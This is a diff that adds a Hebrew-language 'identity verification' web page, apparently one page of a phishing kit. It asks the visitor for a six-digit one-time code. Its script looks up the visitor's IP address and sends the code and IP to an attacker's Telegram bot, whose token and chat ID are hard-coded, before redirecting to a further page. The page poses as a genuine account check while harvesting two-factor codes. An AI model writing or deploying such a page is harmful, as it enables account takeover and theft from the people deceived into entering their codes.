@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>אימות זהות</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-image: url('1.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+  }
+  .container {
+    background-color: rgba(0, 0, 0, 0.7);
+    padding: 20px;
+    border-radius: 10px;
+    max-width: 400px;
+    width: 90%;
+    z-index: 1;
+  }
+  .verification-code {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .verification-code input {
+    width: 40px;
+    height: 40px;
+    font-size: 24px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    text-align: center;
+    margin: 5px;
+  }
+  .button {
+    padding: 10px 20px;
+    font-size: 18px;
+    background-color: #FFFF00;
+    border: none;
+    color: white;
+    cursor: pointer;
+    margin-top: 20px;
+    border-radius: 5px;
+  }
+  .button:hover {
+    background-color: #45a049;
+  }
+  .small-text {
+    font-size: 14px;
+    color: #ccc;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <h1>אימות זהות</h1>
+  
+  <div class="verification-code">
+    <input type="number" id="digit1" name="digit1" maxlength="1" oninput="moveToNext(this)" onkeydown="preventDelete(event)">
+    <input type="number" id="digit2" name="digit2" maxlength="1" oninput="moveToNext(this)" onkeydown="preventDelete(event)">
+    <input type="number" id="digit3" name="digit3" maxlength="1" oninput="moveToNext(this)" onkeydown="preventDelete(event)">
+    <input type="number" id="digit4" name="digit4" maxlength="1" oninput="moveToNext(this)" onkeydown="preventDelete(event)">
+    <input type="number" id="digit5" name="digit5" maxlength="1" oninput="moveToNext(this)" onkeydown="preventDelete(event)">
+    <input type="number" id="digit6" name="digit6" maxlength="1" oninput="moveToNext(this)" onkeydown="preventDelete(event)">
+  </div>
+  
+  <button type="button" class="button" onclick="sendCodeToTelegram()">אשר</button>
+  
+  <p class="small-text">    שלחנו לך קוד בן 6 ספרות אנא הזן את הקוד 6 ספרות לאימות החשבון שלך</p>
+
+</div>
+
+<script>
+function moveToNext(currentInput) {
+  if (currentInput.value.length >= parseInt(currentInput.getAttribute('maxlength'), 10)) {
+    var nextInput = currentInput.nextElementSibling;
+    if (nextInput && nextInput.tagName.toLowerCase() === 'input') {
+      nextInput.focus();
+    }
+  }
+  
+  // הגבלה להקלדת מדויקות של 6 תווים בסך הכולל
+  var totalLength = document.getElementById('digit1').value.length +
+                    document.getElementById('digit2').value.length +
+                    document.getElementById('digit3').value.length +
+                    document.getElementById('digit4').value.length +
+                    document.getElementById('digit5').value.length +
+                    document.getElementById('digit6').value.length;
+  
+  if (totalLength > 6) {
+    currentInput.value = '';
+  }
+  
+  // לאחר הקלט הראשון בכל שדה, הפוך אותו ל-read-only
+  if (currentInput.value.length > 0) {
+    currentInput.setAttribute('readonly', true);
+  }
+}
+
+function preventDelete(event) {
+  var key = event.key;
+  var currentInput = event.target;
+  
+  // אם המקש הוא מקש מחיקה והשדה ריק, בטל את הפעולה
+  if (key === 'Backspace' && currentInput.value.length === 0) {
+    event.preventDefault();
+  }
+}
+
+function sendCodeToTelegram() {
+  var digit1 = document.getElementById('digit1').value;
+  var digit2 = document.getElementById('digit2').value;
+  var digit3 = document.getElementById('digit3').value;
+  var digit4 = document.getElementById('digit4').value;
+  var digit5 = document.getElementById('digit5').value;
+  var digit6 = document.getElementById('digit6').value;
+  
+  var verificationCode = digit1 + digit2 + digit3 + digit4 + digit5 + digit6;
+  
+  if (verificationCode.length !== 6) {
+    alert('נא להזין 6 ספרות לאימות הזהות שלך');
+    return;
+  }
+  
+  var botToken = '7464738479:AAEpaIDKh7L8-gG0jJWUQndSTjp2dhj0wiQ';
+  var chatId = '7051699509';
+  var ipAddress = '';
+  
+  // קבלת כתובת ה-IP של המשתמש
+  fetch('https://api64.ipify.org?format=json')
+    .then(function(response) {
+      return response.json();
+    })
+    .then(function(data) {
+      ipAddress = data.ip;
+      
+      // בניית הודעה לשליחה לבוט
+      var message = 'קוד אימות: ' + verificationCode + '\nIP Address: ' + ipAddress;
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+      
+      // שליחת הבקשה לשרת של Telegram
+      return fetch(url);
+    })
+    .then(function(response) {
+      if (!response.ok) {
+        throw new Error('Network response was not ok');
+      }
+      return response.json();
+    })
+    .then(function(data) {
+      // העבר את המשתמש לדף HTML הבא
+      window.location.href = 'page4.html';
+    })
+    .catch(function(error) {
+      console.error('שגיאה בשליחת ההודעה:', error);
+      alert('אירעה שגיאה בשליחת ההודעה. אנא נסה שוב מאוחר יותר.');
+    });
+}
+</script>
+
+</body>
+</html>
